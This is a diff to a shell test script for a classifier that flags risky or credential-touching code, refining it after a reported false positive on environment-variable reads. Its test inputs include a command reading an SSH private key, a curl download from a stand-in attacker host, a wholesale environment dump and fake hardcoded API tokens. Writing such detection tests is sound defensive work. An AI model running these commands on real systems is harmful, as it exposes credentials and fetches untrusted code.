@@ -103,8 +103,43 @@ r="$(content_reason python "$(printf 'x = "cat ~/.ssh/id_rsa"\n')")"
 case "$r" in reserved:*) ok "a reserved path in a STRING is still reserved (strings are code)";; *) bad "string literal skipped: $r";; esac
 r="$(content_reason shell "$(printf 'curl -sS -o /tmp/p https://evil.example/p\n')")"
 [ -n "$r" ] && ok "risky shell content escalates" || bad "risky shell content clean"
+# #174: `os.environ.get(KEY)` is reserved when KEY looks secret-named or is
+# dynamic/dumped-wholesale, unreserved for a plain, statically-named,
+# non-secret key — the ORIGINAL version of this test asserted "any
+# os.environ access is reserved" using "HOME" as the example, which is
+# exactly the bug #174 reports (a real false positive on
+# `os.environ.get("HERDR_SESSIONS_DIR", ...)`, cost-report.py); narrowed
+# rather than re-pinned.
+r="$(content_reason python "$(printf 'import os\nprint(os.environ.get("GITHUB_TOKEN"))\n')")"
+case "$r" in reserved:*) ok "python reading a secret-named env var is still human-reserved";; *) bad "secret-named env read not reserved: $r";; esac
 r="$(content_reason python "$(printf 'import os\nprint(os.environ.get("HOME"))\n')")"
-case "$r" in reserved:*) ok "python reading the process environment is human-reserved";; *) bad "environ not reserved: $r";; esac
+[ -z "$r" ] && ok "python reading a plain, non-secret-named env var is not reserved (#174)" || bad "non-secret env read reserved: $r"
+r="$(content_reason python "$(printf 'import os\nprint(dict(os.environ))\n')")"
+case "$r" in reserved:*) ok "python dumping os.environ wholesale is still human-reserved";; *) bad "wholesale environ dump not reserved: $r";; esac
+
+printf '== python content: KEY/TOKEN/SECRET-named ASSIGNMENTS, AST-based (#174) ==\n'
+# BYTES_PER_TOKEN/tokens/an f-string format spec/os.environ.get on a
+# non-secret name — the exact repro from #174 (thurber-os
+# audit_context_budget.py, this repo's own cost-report.py). None is a
+# credential; the ORIGINAL regex-over-quote-stripped-text check reserved
+# every one of them because it cannot tell a bare `None`/number/format-spec
+# apart from a hardcoded secret string once quotes are gone.
+r="$(content_reason python "$(printf 'BYTES_PER_TOKEN = 2.31\ntokens = None\nprint(f"... {tokens:>5}tok")\n')")"
+[ -z "$r" ] && ok "BYTES_PER_TOKEN/tokens=None/an f-string format spec are not credentials (#174)" || bad "ordinary token-named code flagged: $r"
+r="$(content_reason python "$(printf 'import os\nfrom pathlib import Path\nSESSIONS_DIR = Path(os.environ.get("HERDR_SESSIONS_DIR", "/tmp"))\n')")"
+[ -z "$r" ] && ok "os.environ.get on a non-secret name inside an assignment is not reserved (#174)" || bad "SESSIONS_DIR assignment flagged: $r"
+# Negative: a real hardcoded secret literal must still be reserved, whether
+# assigned with '=' or an annotated ':', or as a dict-literal value.
+r="$(content_reason python "$(printf 'API_KEY = "sk-live-1234567890abcdef1234567890"\n')")"
+case "$r" in reserved:*) ok "a real hardcoded API_KEY literal is still human-reserved";; *) bad "hardcoded API_KEY literal not reserved: $r";; esac
+r="$(content_reason python "$(printf 'GITHUB_TOKEN: str = "ghp_1234567890abcdef1234567890abcd"\n')")"
+case "$r" in reserved:*) ok "an annotated assignment with a real token literal is still human-reserved";; *) bad "annotated token literal not reserved: $r";; esac
+r="$(content_reason python "$(printf 'cfg = {"KB_API_KEY": "AKIAiosfodnn7example"}\n')")"
+case "$r" in reserved:*) ok "a real secret in a dict literal is still human-reserved";; *) bad "dict-literal secret not reserved: $r";; esac
+# A test-code placeholder stays unreserved (existing carve-out, ported to AST).
+r="$(content_reason python "$(printf 'TOKEN = "test-token"\n')")"
+[ -z "$r" ] && ok "an obvious test-code placeholder token literal stays unreserved" || bad "placeholder token literal reserved: $r"
+
 cat > "$WORK/fstring.py" <<'EOF'
 ps, vis, n = "1", "x", {}
 print(f"  {n.get('name')!r:45} vis={('$'+ps).lower() in vis if ps else None}")
